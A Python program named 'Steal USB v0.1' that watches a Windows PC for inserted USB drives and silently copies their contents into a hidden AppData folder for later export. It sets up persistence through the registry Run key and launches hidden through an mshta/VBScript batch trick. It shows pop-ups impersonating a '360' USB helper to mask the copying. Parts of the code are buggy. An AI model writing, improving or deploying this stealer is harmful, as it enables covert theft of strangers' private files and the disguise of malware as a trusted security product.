import configparser
import os
import shutil
import sys
import threading
import time
import tkinter
from tkinter import messagebox as msg

import psutil
import win32api
import win32con

removelist = []
root = tkinter.Tk()
root.withdraw()


def cp(disk, cpath):
    global removelist
    time_tuple = time.localtime()
    drive = disk.replace(':', '').replace('\\', '')
    cpath += '\\files\\{}_{}_{}_{}_{}\\{}'.format(time_tuple[0], time_tuple[1], time_tuple[2], time_tuple[3],
                                                  time_tuple[4], drive)
    shutil.copytree(disk, cpath)
    removelist.pop(disk)
    msg.showinfo('360U盘助手', '操作成功完成！')


def takeFile(path, disk):
    if msg.askyesno("U盘文件复制工具", "检测到导出U盘插入，是否导出文件"):
        time_tuple = time.localtime()
        cpath = disk + 'usbfiles\\{}_{}_{}_{}_{}'.format(time_tuple[0], time_tuple[1], time_tuple[2], time_tuple[3],
                                                         time_tuple[4])
        src = path + '\\files'
        t = threading.Thread(target=shutil.copytree(src, cpath), args=(src, cpath))
        t.start()
        t.join()
        msg.showinfo("U盘文件复制工具", "操作成功完成！")


def startListen(path):
    global removelist
    while True:
        #  设置休眠时间
        time.sleep(1)
        #  检测所有的驱动器，进行遍历寻找哦
        for item in psutil.disk_partitions():
            if 'removable' in item.opts:
                res = []
                driver, opts = item.device, item.opts
                #  检测所有的驱动器，进行遍历寻找哦
                for i in psutil.disk_partitions():
                    driver, opts = i.device, i.opts
                    print(driver)
                #  输出可移动驱动器符号
                if driver in removelist:
                    break
                else:
                    removelist.append(driver)
                    t = threading.Thread(target=cp, args=(driver, path))
                    t.start()


def main(path):
    os.system('cls')
    config.read(path + '\\config.ini')
    print('Steal USB v0.1')
    print('请选择操作:')
    print('1、开始监听\n2、重新配置\n3、卸载服务\n4、安装服务\n5、退出')
    mode = input('>>')
    if mode == '1':
        print('开始监听！')
        startListen(path)
    elif mode == '2':
        init(path)
    elif mode == '3':
        uninstall()
    elif mode == '4':
        install(path)
    elif mode == '5':
        exit()
    else:
        print('无效的选项！')
        main(path)


def uninstall():
    KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    name = 'stealusb_run'
    key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
    win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, '')
    win32api.RegCloseKey(key)
    print('卸载成功！')
    main(path)


def install(path):
    p1 = os.getcwd()
    p2 = sys.argv[0]
    ppath = os.path.join(p1, p2)
    path += '\\run.bat'
    crtScript(ppath, path)
    name = 'stealusb_run'
    KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
    try:
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, KeyName, 0, win32con.KEY_ALL_ACCESS)
        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(key)
    except:
        print('添加失败，请手动添加文件地址：')
        print(path)
        return
    print('添加成功！')
    main(path)


def crtScript(path, p2):
    script = '''@echo off
if "%1" == "h" goto begin
mshta vbscript:createobject("wscript.shell").run("""%~0"" h",0)(window.close)&&exit
:begin
{} silence'''.format(path)
    with open(p2, 'w') as f:
        f.write(script)


def init(path):
    my_usb = input('请输入你的U盘卷标：')
    if my_usb == '':
        print("空的卷标")
        return
    config.add_section('config')
    config.set('config', 'my-usb', my_usb)
    config.write(open(path + '\\config.ini', "w"))
    print('初始化设置完成，正在进入主程序......')
    time.sleep(0.5)
    main(path)


if __name__ == '__main__':

    sysenv = os.environ
    appdata = sysenv['AppData']
    path = appdata + "\\usbstealer"
    try:
        if sys.argv[1] == 'silence':
            startListen(path)
    except:
        pass
    config = configparser.ConfigParser()
    if os.path.isdir(path):
        if not os.path.isdir(path + '\\files'):
            os.mkdir(path + '\\files')
        if os.path.isfile(path + '\\config.ini'):
            main(path)
        else:
            init(path)
    else:
        os.mkdir(path)
        main(path)
